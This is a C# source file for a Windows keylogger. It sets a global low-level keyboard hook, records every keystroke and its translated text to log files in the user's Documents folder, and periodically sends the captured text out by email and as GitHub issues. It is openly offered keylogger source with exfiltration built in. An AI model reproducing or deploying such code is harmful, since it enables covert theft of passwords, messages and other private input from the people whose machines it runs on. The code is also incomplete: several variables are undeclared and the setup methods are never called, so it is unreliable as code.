using System;
using System.IO;
using System.Windows.Forms;
using System.Diagnostics;
using System.Runtime.InteropServices;
using KeyLog.WindowsApi;


namespace KeyLog.Common {
  class KbdHook {

    static IntPtr Hook = IntPtr.Zero;
    static LowLevelKeyboardProc Proc;
    static TextWriter FHead, SHead;
    static TextWriter FCode, SCode;
    static TextWriter FText, SText;
    static int TextWritten;
    static int CodeWritten;
    static int Flush;
    static Smtp    Email;
    static Octokit GitHub;

    readonly static string PAPP = "extra-keylog";


    public static void Init() {
      Proc = new LowLevelKeyboardProc(KbdHookProc);
      ProcessModule module = Process.GetCurrentProcess().MainModule;
      IntPtr hMod = Kernel32.GetModuleHandle(module.ModuleName);
      Hook = User32.SetWindowsHookEx(HookType.WH_KEYBOARD_LL, Proc, hMod, 0);
      User = Environment.UserName;
      LHead.Write("["+User+"] ");
      LHead.Write(User + "-key ");
      LHead.Write(User + "-txt ");
      LHead.Flush();
      KbdChar.Init();
    }


    // Keyboard hook procedure.
    static IntPtr KbdHookProc(int code, WM wParam, [In] KBDLLHOOKSTRUCT lParam) {
      if (code >= 0) {
        Keys k = (Keys) lParam.vkCode;
        bool active = wParam == WM.KEYDOWN || wParam == WM.SYSKEYDOWN;
        WriteCode(active ? k+"+ " : k+"- ");
        WriteText(KbdChar.Char(lParam.vkCode, active));
      }
      return User32.CallNextHookEx(IntPtr.Zero, code, wParam, lParam);
    }


    static void WriteCode(string s) {
      FCode.Write(s);
      SCode.Write(s);
      CodeWritten += s.Length;
      if (CodeWritten < Flush) return;
      FCode.Flush();
      Email.Send("", SCode.ToString());
      GitHub.CreateIssue("", SCode.ToString());
      SCode.GetStringBuilder().Clear();
      CodeWritten = 0;
    }

    static void WriteText(string s) {
      FText.Write(s);
      SText.Write(s);
      TextWritten += s.Length;
      if (TextWritten < Flush) return;
      FText.Flush();
      Email.Send("", SText.ToString());
      GitHub.CreateIssue("", SText.ToString());
      SText.GetStringBuilder().Clear();
      TextWritten = 0;
    }


    static void InitFiles() {
      string user = Environment.UserName;
      string docs = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
      string phead = Path.Combine(docs, PAPP, "head.log");
      string pcode = Path.Combine(docs, PAPP, user + "-code.log");
      string ptext = Path.Combine(docs, PAPP, user + "-text.log");
      FHead = new StreamWriter(phead, true);
      FCode = new StreamWriter(pcode, true);
      FText = new StreamWriter(ptext, true);
    }

    static void InitStrings() {
      SHead = new StringWriter();
      SCode = new StringWriter();
      SText = new StringWriter();
    }
  }
}
